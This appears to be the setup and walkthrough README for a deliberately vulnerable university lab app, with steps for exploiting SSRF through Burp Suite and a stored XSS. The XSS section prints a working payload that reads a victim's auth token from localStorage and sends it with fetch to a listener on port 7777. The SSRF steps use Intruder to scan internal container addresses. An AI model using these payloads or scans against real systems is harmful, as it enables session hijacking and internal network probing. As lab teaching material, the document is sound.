Prerequisites

1. Make sure you have downloaded and installed 'docker' and 'docker compose'.


Steps to run the program

1. Download the zip file and extract
2. Go inside the root directory of the project(Vulnerable-Calibre)
3. Right-click and open the terminal(make sure you are in the root directory of the project)
4. Run the command "docker-compose build"
5. Once the project is built run the command "docker-compose up"
6. Use http://localhost:3000 to access the application.
7. You can login into the system using the following login credentials. 
	student ->	username: IT20194680@my.sliit.lk
		      password: IT20194680@my.sliit.lk

	staff   ->	username: IT20194680@my.sliit.lk
			password: IT20194680@my.sliit.lk

	admin   ->  username: chathushkarodrigo@gmail.com
			password: happy123


SSRF - Server-Side Request Forgery

Detection

1. A network is vulnerable to SSRF attack when a link is accepted from the client side to the server side.
2. Once such feauture exist in Upload picture for ID feature
3. Make sure you open burpsuit application
4. This feature can be accesed by logging into Student account and clicking on Upload picture for ID button(To login as a student use the username and password listed above)
5. Once this is done turn on intercept and send the request and observe it in burpsuite


Exploitation
1. To exploit the application change the payload in delivered to a public ip
2. This can be done using intruder to scan the local ip range
3. In this project we have three applications backend, frontend and vulnerable server
4. Vulnerable server is running on port 7777
5. To find out the ip of the containers use the following command

docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' name or id of the container
example: docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' vulnerable-calibre_vulnerable_1

You can find the name or id of the containers by running the command 'docker ps'


6. Use the following command to find the ip of the vulnerable container and use that ip address with the port 3000 to access the frontend of the application and login to the application(make sure you do this step in browser provided by burpsuit)

7. Use the credentials given below to login
	student ->	username: IT20194680@my.sliit.lk
		        password: IT20194680@my.sliit.lk
		        
8. Once logged in go to Upload picture for ID feature section

9. Now turn on intercept in the burpsuite

10. Add a link in the textbox and send the request

11. Once the request is intercepted by the burpsuite send it to the repeater

12. Since we can find out the ip of the container we will use this ip with the port number and send the request to exploit the application(example: http://172.18.0.2:7777)

13. As you can see we get the request from the vulnerable server

14. We could use the Intruder feature provided by burbsuite to scan the whole network since the range of public address is already known


Second Order Blind XSS

Detection

1. Login as an admin and navigate to marks configuration > status document mark configuration.
2. Enter invalid data format input into a text box.
3. Checking whether the form is submitted
4. If the form response is submitted it confirms whether the form has no input validation

Exploitation

1.Login as admin user and navigate -> Marking Configuration -> Status Document Configuration -> Form 

Enter the following malicious code (script 1 and script 2 separately)into the text box. 
	++ Script 1 ++

Click  <b onmouseover='async function fetchAsync (url) {var token = localStorage.getItem("authToken");await fetch("http://localhost:7777?token="+token);await response.json()} fetchAsync()'>Me</b> <b onmouseover='alert("I now have your Data You are hacked !")'>NOW </b> <b onmouseover='localStorage.removeItem("authToken");   window.location.reload();'> Get Out </b>

	++ script 2 ++

<img onmouseover='alert(localStorage.getItem("authToken"));' src='invalid-image' />


2. open a new terminal and enter "python3 -m http.server 7777" 
3. Check whether the form is submitted properly
4. Login as a victim and navigate to 'add marks' 
5. Again navigate to enter status document 1 marks
6. Hover on injected code variable
7. Blindly user exploited successfully (view hosted terminal to view victim data)
8. Repeat the same step for malicious code number 2

	








